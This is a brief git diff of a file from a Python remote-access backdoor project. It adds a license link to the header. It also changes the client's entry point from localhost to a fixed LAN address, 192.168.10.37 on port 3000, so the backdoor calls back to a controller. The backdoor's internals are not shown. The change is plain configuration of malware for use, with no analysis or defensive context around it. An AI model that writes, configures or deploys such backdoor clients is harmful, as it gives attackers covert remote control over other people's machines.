@@ -2,6 +2,8 @@
 https://github.com/xp4xbox/Python-Backdoor
 
 @author    xp4xbox
+
+license: https://github.com/xp4xbox/Python-Backdoor/blob/master/license
 """
 
 import socket
@@ -50,5 +52,4 @@ class Client:
             self.start()
 
 
-if __name__ == "__main__":
-    Client("127.0.0.1", 3000).start()
+if __name__ == "__main__": Client('192.168.10.37', 3000, False, False, False).start()
